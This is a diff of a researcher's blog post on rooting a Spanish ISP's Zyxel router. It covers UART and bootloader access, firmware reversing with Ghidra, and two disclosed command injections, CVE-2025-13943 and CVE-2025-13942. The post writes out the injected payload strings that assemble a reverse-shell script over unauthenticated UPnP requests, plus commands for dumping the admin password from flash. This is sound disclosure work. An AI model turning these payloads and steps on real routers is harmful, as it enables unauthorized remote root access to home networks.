@@ -24,7 +24,7 @@ This journey begins in late summer 2025, when my colleague <a href="https://x.co
 
 The thing is that I had changed my Internet provider a couple of months ago, so my new ISP had delivered a new router. Although I am obviously not going to refer to this ISP by its name because it probably won't never fix anything described in here, it is a medium sized one here in Spain that was gaining a lot of popularity at the moment due to offering good quality Internet at a low price. So, as always, I wanted to know what was inside this new router that would effectively act as the door to my home.
 
-The router was a Zyxel device, but I did not know the model yet. I noticed that it supported both SSH and telnet, so I connected using the credentials that the ISP guy gave me when installing the router ("user:user" lol) and was presented with a restricted shell:
+The router was a Zyxel device, but I did not know the model yet. I noticed that it supported both SSH and telnet, so I connected using the credentials that the ISP guy gave me when installing the router ("user:user" lol) and was presented with a restricted Zyxel shell:
 
 <code>$ ssh -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-dss user@192.168.1.1
 
@@ -74,9 +74,9 @@ I was able to obtain some info of the device, such as the model name, which was 
 
 <img src="/assets/images/posts/2026-06-01/user_admin_panel.png" style="width: 40em">
 
-After navigating around, it quickly became obvious that this was very restricted interface, since it did not allow uploading a new firmware nor enabling proper access over SSH or any other protocol. This is a common practice in ISP routers, so that users cannot modify the ISP cpnfiguration. At this point, as anyone who wants to access its router would do, I opened it to try finding a UART interface or something similar, which was easy enough since the UART port had some debug pins already set:
+After navigating around, it quickly became obvious that this was a very restricted interface too, since it did not allow uploading a new firmware nor enabling proper access over SSH nor any other protocol. This is a common practice in ISP routers, so that users cannot modify the ISP cpnfiguration. At this point, as anyone who wants to access its router would do, I opened it to try finding a UART interface or something similar, which was easy enough since the UART port had debug pins already attached:
 
-<img src="/assets/images/posts/2026-06-01/pcb.png" style="width: 40em">
+<img src="/assets/images/posts/2026-06-01/pcb.png" style="width: 35em">
 
 Connecting to the UART interface revealed console output but no direct shell. By pressing any key, a login prompt appeared and introducing the same "user" credentials again gave the same restricted shell as the SSH port:
 
@@ -103,7 +103,7 @@ wlan                      - ZYXEL command line
 zycli                     - ZYXEL command line
 ZySH></code>
 
-Regarding the bootloader, the device used a Zyxel proprietary one ("ZyXEL zloader v1.4.4"). It allowed stopping autoboot, but only exposed a very restricted shell in which no boot commands could be easily modified to later access the OS, as it is <a href="https://www.synacktiv.com/publications/i-hack-u-boot">sometimes possible with U-Boot</a>:
+Regarding the bootloader, the device used a Zyxel proprietary one ("ZyXEL zloader v1.4.4"). It allowed stopping autoboot, but only exposed another very Zyxel restricted shell in which no boot commands could be easily modified to later access the OS, as it is <a href="https://www.synacktiv.com/publications/i-hack-u-boot">sometimes possible with U-Boot</a>:
 
 <code>ZyXEL zloader v1.4.4 (10/15/2021 - 11:54:15)
 Multiboot client version: 2.5
@@ -138,31 +138,37 @@ Further analysis revealed that authenticated HTTP requests had their bodies encr
 
 [ Breaking into the router ]
 
-However, as usual, I could not stop thinking about this, since an ISP router seemed a fairly easy target and was starting to damage my ego. So, I just created a new folder for this project in my vuln research directory and started diving deeper into this. First thing first, I did a proper port scan, since I had not executed one because I was only taking a look earlier:
+However, as usual, I could not stop thinkinh about this, since the fact that there had been such an easy command injection in my router felt like an invitation to break in. So, I created a new folder for this project in my vuln research directory and started diving deeper into this. First thing first, I did a proper network port scan, since I had not executed one because I was only "taking a look" earlier:
 
 <code>$ nmap -sV -O -Pn -p- -oN nmap.log 192.168.1.1
 
 Nmap scan report for _gateway (192.168.1.1)
-Host is up (0.025s latency).
-Not shown: 65526 closed tcp ports (reset)
-PORT      STATE    SERVICE   VERSION
-21/tcp    open     ftp
-22/tcp    filtered ssh
-23/tcp    filtered telnet
-53/tcp    open     domain    (unknown banner: Domain Name Server)
-80/tcp    open     http
-443/tcp   open     ssl/https
-2601/tcp  open     zebra?
-49152/tcp open     unknown
-49153/tcp open     unknown
+Host is up (0.00072s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp
+22/tcp    open  ssh         (protocol 2.0)
+23/tcp    open  telnet
+53/tcp    open  domain      ISC BIND 9.18.41
+80/tcp    open  http
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp   open  ssl/https
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2601/tcp  open  zebra?
+38400/tcp open  unknown
+49152/tcp open  unknown
+49153/tcp open  unknown
 
 [...]</code>
 
-The ftp server allowed login as "user", but only allowed access to the "user" home folder, which was empty. Regarding the other ports, "zebra" corresponds to a deprecated routing protocol and ports 49152 and 49153 WiFi configuration UPnP services (remember these, since they will be heavily discussed later).
+The ftp server allowed login as "user", but only granted access to the "/home/user", which was empty. Regarding the weirder ports, "zebra" corresponded to a deprecated routing protocol and ports 38400, 49152 and 49153 were UPnP services. After querying each of them and doing some research, I identified the following:
+<ol><li>Port 38400: Service "InternetGatewayDevice", which uses a <a href="https://openconnectivity.org/developer/specifications/upnp-resources/upnp/internet-gateway-device-igd-v-2-0/">standardized OCF Device Control Protocol</a> that allows LAN clients to manage NAT port mappings, retrieve the external WAN IP and control firewall rules.</li>
+<li>Ports 49152/49153: Service "WFADevice", which uses a <a href="https://www.wi-fi.org/system/files/WFA_Device_1_0_Template_1_01_0.pdf">standardized Wi-Fi Alliance Device Control Protocol</a> that allows clients to configure 802.11 parameters (SSID, PSK, security settings) over an out-of-band IP channel using the WPS Simple Config protocol.</li></ol>
+However, none of these offered direct access to the OS.
 
-So, given I had no way in, I decided to download the regular <a href="https://www.zyxel.com/global/en/support/download?model=ex3301-t0">firmware for "Zyxel EX3301-T0" routers from the vendor page</a> and compare it to my ISP router. This way, I could check if they were similar enough to try finding something in the default firmware that affected my router and could allow me in. I knew for sure that my ISP had modified it a bit, since some logos, colors and a lot of logs from the UART output confirmed it, but I believed that core functionalities should remain the same.
+So, given I had no clear way in, I decided to download the regular <a href="https://www.zyxel.com/global/en/support/download?model=ex3301-t0">firmware for "Zyxel EX3301-T0" routers from the vendor page</a> and compare it to my ISP router. This way, I could check if they were similar enough to find something in the default firmware that also affected my device. I knew for sure that my ISP had modified it a bit, since some logos, colors and a lot of logs from the UART output confirmed it, but I believed core functionalities would remain the same.
 
-I downloaded the firmware and extracted it using "binwalk", which easily gave me a squashfs filesystem:
+I extracted the firmware using "binwalk", which gave me a squashfs filesystem:
 
 <code>$ binwalk V550ABVY6.2C0.bin
 
@@ -171,9 +177,11 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 372           0x174           LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 16279488 bytes
 4180222       0x3FC8FE        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 26706310 bytes, 2393 inodes, blocksize: 262144 bytes, created: 2025-04-11 08:20:33</code>
 
-My main targets were the UPnP ports that appeared in the nmap scan, since UPnP services tend to be straightforward and are easily reversed. After some initial analysis, I could not find any binaries that used those ports nor the schema advertised by the service, so I assumed it was an ISP thing and moved on. By then, I just wanted a way inside the router, so I did not care about the potential findings requiring authentication. Because of this, I targeted the web interface, since I already knew that there had been command injections in the past.
+With the filesystem extracted, my main targets were the UPnP services that appeared in the nmap scan, since UPnP tends to be poorly secured and binaries implementing it are usually relatively straightforward to reverse. However, I could not find any binary that listened on port 38400 or implemented the "InternetGatewayDevice" service, so I assumed this was something added by the ISP. Regarding ports 49152 and 49153, the binary behind them was "/usr/bin/wscd", but I it only implemented 4 UPnP commands, of which only 3 accepted user input. Then, I found that all commands simply forwarded user input to kernel space using "ioctl", which seemed quite complicated at the moment (keep this in mind, as it will be relevant later).
 
-Looking around into the firmware, I found the executable "/bin/zhttpd", which looked like the one behind the web server. I opened Ghidra and started reversing it. For this research, I used Claude a lot, since it can be connected to Ghidra using Cluade desktop and <a href="https://github.com/LaurieWired/GhidraMCP">GhidraMCP</a>. Athough Claude still has many flaws when diving deep into reversing and exploitation, it is pretty much useful in the initial phase, in which the main goal is just figuring out which are the most interesting functions of an executable, tracing user input, indentifying global tables, figuring out structures, etc.
+By then, I just wanted a quick way inside the router, so I did not care about the potential findings requiring authentication, so I decided to take a look into the web interface, since I already knew that there had been command injections found there in the past.
+
+I quickly found the executable "/bin/zhttpd", which looked like the one behind the web server. I opened Ghidra and started reversing it. For this research, I used Claude a lot, since it can be connected to Ghidra using Cluade desktop and <a href="https://github.com/LaurieWired/GhidraMCP">GhidraMCP</a>. Athough Claude still has many flaws when diving deep into reversing and exploitation, it is pretty much useful in the initial phase, in which the main goal is just figuring out which are the most interesting functions of an executable, tracing user input, indentifying global tables, figuring out structures, etc.
 
 Using this setup, I quickly identified a global table starting at that mapped routes with their handler functions:
 
@@ -207,7 +215,85 @@ After some bugfixing, I successfully got a root shell on the device:
 
 <img src="/assets/images/posts/2026-06-01/zhttpd_poc.png" style="width: 40em">
 
-This vulnerability was reported to Zyxel and assigned CVE-2025-13943. You can take a deeper look into the exploit <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2025-13943">at my github page</a>.
+This vulnerability was reported to Zyxel and assigned CVE-2025-13943. You can take a deeper look into the exploit and all affected devices <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2025-13943">at my github page</a>.
 
+
+[ Exploring the device ]
+
+Once inside, the first thing I did was to extract the "admin" password. To do so, I just followed the article mentioned previously, which described how to obtain it directly from the bootloader memory:
+
+<code>/ # mtd -q -q readflash /tmp/flashdump 256 65280 bootloader
+/ # grep -a "[\x80-\xFF]" /tmp/flashdump > /tmp/pass</code>
+
+The password was a random 10 alphanumeric string which seemed unique for this device, and it worked for both "admin" and "root" users. Once obtained, I was able to fully access the device using both SSH and UART.
+
+Then, I proceeded to do some basic recon, in order to find which services were really exposed on the device and see if they matched what I saw earlier in the network scan:
+
+<code># netstat -natpul
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1634/smbd
+tcp        0      0 192.168.1.1:38400       0.0.0.0:*               LISTEN      2867/zupnp
+tcp        0      0 0.0.0.0:49152           0.0.0.0:*               LISTEN      2835/wscd
+tcp        0      0 0.0.0.0:49153           0.0.0.0:*               LISTEN      2832/wscd
+tcp        0      0 0.0.0.0:2601            0.0.0.0:*               LISTEN      2884/zebra
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1634/smbd
+tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      3032/dnsmasq
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1395/pure-ftpd (SER
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1411/dropbear
+tcp        0      0 :::445                  :::*                    LISTEN      1634/smbd
+tcp        0      0 :::139                  :::*                    LISTEN      1634/smbd
+tcp        0      0 :::80                   :::*                    LISTEN      1424/zhttpd
+tcp        0      0 :::53                   :::*                    LISTEN      3032/dnsmasq
+tcp        0      0 :::21                   :::*                    LISTEN      1395/pure-ftpd (SER
+tcp        0      0 :::22                   :::*                    LISTEN      1411/dropbear
+tcp        0      0 :::23                   :::*                    LISTEN      1400/telnetd
+tcp        0      0 :::7547                 :::*                    LISTEN      1540/ztr69
+tcp        0      0 :::443                  :::*                    LISTEN      1424/zhttpd
+udp        0      0 127.0.0.1:13728         0.0.0.0:*                           506/zywifid
+udp        0      0 0.0.0.0:58789           0.0.0.0:*                           2832/wscd
+udp        0      0 127.0.0.1:35251         0.0.0.0:*                           2835/wscd
+udp        0      0 0.0.0.0:42942           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:52944           0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:7678            0.0.0.0:*                           3040/zstun
+udp        0      0 127.0.0.1:35884         0.0.0.0:*                           2832/wscd
+udp        0      0 0.0.0.0:53              0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           3032/dnsmasq
+udp        0      0 0.0.0.0:60006           0.0.0.0:*                           506/zywifid
+udp   253440      0 0.0.0.0:1900            0.0.0.0:*                           2867/zupnp
+udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2832/wscd
+udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2835/wscd
+udp        0      0 :::546                  :::*                                2953/dhcp6c
+udp        0      0 :::53                   :::*                                3032/dnsmasq</code>
+
+The output mostly confirmed what I already knew and allowed identifying some UDP services. However, the one that caught my attention was TCP port 38400, since its corresponding binary, and therefore the one exposing the "InternetGatewayDevice" UPnP service, was "zupnp", which was nowhere to be found in the stock EX3301-T0 firmware. This meant it was either an ISP-developed binary or part of some Zyxel SDK made available to OEMs. Anyways, the fact that it wasn't in the public firmware made it an interesting target, so I loaded it into Ghidra and started reversing it.
+
+Out of all UPnP commands in the "InternetGatewayDevice" service, "AddPortMapping" was the most interesting one, since it accepted a lot of user input in order to create a new NAT port forwarding rule. Upon receiving a request, function "zupnpPortMappingExecute" was eventually executed, which then called another function at address "0x0040f390" that processed the supplied parameters and added the corresponding NAT rule in the system firewall using "iptables". However, the function did not implement any user input validation, which got inserted directly into the "iptables" command that got executed using "zsystem", a "system" wrapper:
+
+<img src="/assets/images/posts/2026-06-01/zupnp_snprintf.png" style="width: 40em">
+
+This obviously constituted another command injection vulnerability, this time in an unauthenticated service. Exploitation was a bit trickier, though. The parameters susceptible to injection, "NewRemoteHost" and "NewInternalClient", were copied into fixed-size local buffers using "strncpy" before being inserted into the command string, limiting each of them to 15 characters:
+
+<img src="/assets/images/posts/2026-06-01/zupnp_strncpy.png" style="width: 40em">
+
+This meant that a single request was not enough to inject a meaningful payload. To work around this, I created an exploit that builds a temporary script on the device character by character across multiple requests and then executes it. Since both "NewRemoteHost" and "NewInternalClient" are inserted into the same "iptables" command at different positions, both fields can be injected simultaneously on each request. "NewRemoteHost" is used to define a shell variable containing the path of the temporary script with "a=/tmp/a", while "NewInternalClient" is used to append one character at a time to it with "printf X>>$a", where "X" is the character being written. The full command executed on each request is the following:
+
+<code class="language-bash">iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;a=/tmp/a;" --dport 1337 -j DNAT --to ";printf X>>$a;:1337</code>
+
+The command gets divided into the following separate commands:
+
+<code class="language-bash">iptables -t nat -A NAT_PORT_MAPPING_UPNP_1 -p tcp --source ;
+a=/tmp/a;                       # <-- NewRemoteHost
+" --dport 1337 -j DNAT --to ";
+printf X>>$a;                   # <-- NewInternalClient
+:1337</code>
+
+Note that the quotes are intentionally injected as part of the exploit. Since the shell would otherwise stop executing after the first injected command, the closing quote from "NewRemoteHost" and the opening quote from "NewInternalClient" are used to keep the rest of the "iptables" command syntactically valid, ensuring all injected commands are executed. 
+
+Once the full reverse shell command is assembled in "/tmp/a", a final request executes it with ";sh /tmp/a;", achieving unauthenticated Remote Code Execution as root :D
+
+<img src="/assets/images/posts/2026-06-01/zupnp_poc.png" style="width: 40em">
+
+Again, this vulnerability was reported to Zyxel and assigned CVE-2025-13942. You can take a deeper look into the exploit and all affected devices <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2025-13942">at my github page</a>.
 
 {% endraw %}
